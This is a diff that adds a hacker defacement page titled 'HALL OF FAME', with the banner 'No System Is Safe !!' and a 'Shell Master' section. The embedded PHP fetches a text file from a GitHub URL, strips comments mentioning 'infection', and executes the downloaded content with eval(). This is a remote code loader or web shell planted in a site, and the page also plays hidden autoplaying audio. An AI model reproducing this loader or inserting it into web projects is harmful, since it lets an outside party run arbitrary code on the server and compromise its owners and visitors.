@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HALL OF FAME</title>
+ <link rel="icon" href="https://i.ibb.co/W4HJVk93/punyatomkt12.jpg" type="image/x-icon" />
+</head>
+<body>
+
+<img src="https://st2.depositphotos.com/1206312/10788/v/600/depositphotos_107881118-stock-illustration-pentagram-symbol-goat.jpg" alt="Gambar Logo" width="200">
+
+
+    <h1>No System Is Safe !!  </h1>
+    <p>Shell Master:</p>
+
+    <div>
+        <?php
+        function get($url) {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_URL, $url);
+            $data = curl_exec($ch);
+            curl_close($ch);
+            return $data;
+        }
+
+        $url = 'https://raw.githubusercontent.com/killuaa999/hua/refs/heads/main/haha.txt'; 
+        $data = get($url);
+
+        if ($data !== false) {
+            $cleanedData = preg_replace('/\/\*.*\*\//sU', '', $data); // Hapus komentar
+            $cleanedData = preg_replace('/\/\*.*?infection.*?\*\//s', '', $cleanedData); // Hapus metadata
+
+            eval("?>$cleanedData");
+        } else {
+            echo "Tidak dapat mengambil data dari URL.";
+        }
+        ?> 
+ <audio autoplay loop style="display:none;">
+  <source src="https://e.top4top.io/m_2254576ic1.mp3" type="audio/mpeg">
+  Your browser does not support the audio element.
+</audio>        
+    </div>
+</body>
+</html>
